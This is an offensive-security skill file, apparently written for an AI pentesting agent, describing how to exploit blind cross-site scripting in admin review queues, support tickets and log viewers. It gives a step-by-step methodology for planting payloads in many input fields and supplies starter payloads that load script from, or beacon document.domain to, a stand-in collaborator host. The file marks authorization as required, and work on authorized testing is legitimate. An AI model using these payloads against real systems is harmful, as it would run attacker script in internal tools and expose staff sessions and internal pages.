---
name: blind-xss
description: >-
  Exploit blind XSS (CWE-79): payload fires later in a context you can't see (admin review
  queues, support tickets, log viewers, back-office dashboards), confirmed via an OOB callback.
  Invoke when input is stored and likely rendered in an internal tool you have no direct view
  of. Uses a callback payload that phones home with DOM/context details when it executes.
family: 07-client-side
type: exploit
owasp: [A03:2021]
cwe: [CWE-79]
requires: [scope-guard, util-oast-oob, evidence-recorder]
authorization: required
---

# Blind XSS

## Invoke when
- Input is stored and probably viewed later in an out-of-sight internal/admin context.

## Methodology
1. Seed OOB-callback payloads into every field that might reach an internal viewer (name, UA,
   referer, address, support message, filename).
2. Payload beacons back the executing origin/URL/cookies-presence to your collaborator on fire.
3. Correlate which seeded field/context fired (unique token per injection point).
4. Grade impact from the callback's reported context (admin panel = high).

## Starter payloads
- `"><script src=//collab.tld/x.js></script>` with a unique path per field; `<img src=x onerror="new Image().src='//collab.tld/'+document.domain">`.

## False-positive filters
- A callback for asset load without JS execution (e.g., `<img>` only) proves reflection, not script exec — confirm the JS ran.

## Tooling
- XSS Hunter-style collaborator that records origin/DOM on fire.

## Chains to
- `stored-xss` (once the sink is known), `chain-builder`.
